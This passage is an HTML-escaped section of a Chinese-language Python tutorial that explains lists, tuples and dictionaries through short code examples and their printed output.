列表元素 :  [&#39;H&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39; &#39;, &#39;W&#39;, &#39;o&#39;, &#39;r&#39;, &#39;l&#39;, &#39;d&#39;]
更新后的列表 :  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, &#39;Baidu&#39;]
123 元素个数 :  2
Runoob 元素个数 :  1
扩展后的列表： [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, 0, 1, 2, 3, 4]
Runoob 索引值为 1
Taobao 索引值为 2
列表插入元素后为 :  [&#39;Google&#39;, &#39;Baidu&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]
列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;]
列表现在为 :  [&#39;Google&#39;]
列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;]
列表现在为 :  [&#39;Google&#39;, &#39;Runoob&#39;]
列表反转后:  [&#39;Baidu&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Google&#39;]
List :  [&#39;Facebook&#39;, &#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]
列表清空后 :  []
list2 列表:  [&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;, &#39;Baidu&#39;]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;元组&#34;&gt;&lt;a href=&#34;#元组&#34; class=&#34;headerlink&#34; title=&#34;元组&#34;&gt;&lt;/a&gt;元组&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;元组元素不能更改&lt;/li&gt;
&lt;li&gt;元组写在小括号内，以&lt;code&gt;,&lt;/code&gt;分隔&lt;/li&gt;
&lt;li&gt;各元素类型可以不同&lt;/li&gt;
&lt;li&gt;元组的索引切片操作与string一样&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dou&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
tuple2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
tuple3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 单个元素后面加逗号&lt;/span&gt;
tuple4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空元组&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ()&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1,)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第一个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第二个到第三个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1.2, &#39;test&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第三个及前面的所有&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; tuple2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, &#39;test2&#39;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
()
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1,)
1
(1.2, &#39;test&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, &#39;test2&#39;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;运算符-2&#34;&gt;&lt;a href=&#34;#运算符-2&#34; class=&#34;headerlink&#34; title=&#34;运算符&#34;&gt;&lt;/a&gt;运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;tuple6 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple6&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple6&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 列表长度&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 组合&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 重复&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 存在与否&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 迭代&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
(1, 2, 3, &#39;test&#39;)
4
(1, 2, 3, 4, 5, 6)
(&#39;test&#39;, &#39;test&#39;, &#39;test&#39;, &#39;test&#39;)
True
1 2 3 
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数-2&#34;&gt;&lt;a href=&#34;#函数-2&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;方法及描述&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;实例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;len(tuple) 计算元组元素个数。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tuple1 = (&#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; len(tuple1) 3 &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;max(tuple) 返回元组中元素最大值。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; max(tuple2) &#39;8&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;min(tuple) 返回元组中元素最小值。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tuple2 = (&#39;5&#39;, &#39;4&#39;, &#39;8&#39;) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; min(tuple2) &#39;4&#39; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;tuple(iterable) 将可迭代系列转换为元组。&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; list1= [&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;] &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tuple1=tuple(list1) &lt;/code&gt;&lt;br&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tuple1 (&#39;Google&#39;, &#39;Taobao&#39;, &#39;Runoob&#39;, &#39;Baidu&#39;)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&#34;字典&#34;&gt;&lt;a href=&#34;#字典&#34; class=&#34;headerlink&#34; title=&#34;字典&#34;&gt;&lt;/a&gt;字典&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;字典是无序的，依靠键值对来存取&lt;/li&gt;
&lt;li&gt;字典用&lt;code&gt;{}&lt;/code&gt;标识， &lt;code&gt;键(key) : 值(value)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;key&lt;/code&gt;不可变，并且是唯一的&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;{}&lt;/code&gt;创建空字典&lt;/li&gt;
&lt;li&gt;键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空字典&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {2: &#39;test&#39;, &#39;test&#39;: 1}&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dddd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
